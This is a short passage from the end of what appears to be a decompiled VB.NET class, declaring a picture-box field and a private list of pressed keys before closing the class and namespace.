		Public syncPicbox As Object

		' Token: 0x040003E9 RID: 1001
		Private _keysPressed As List(Of Keys)
	End Class
End Namespace
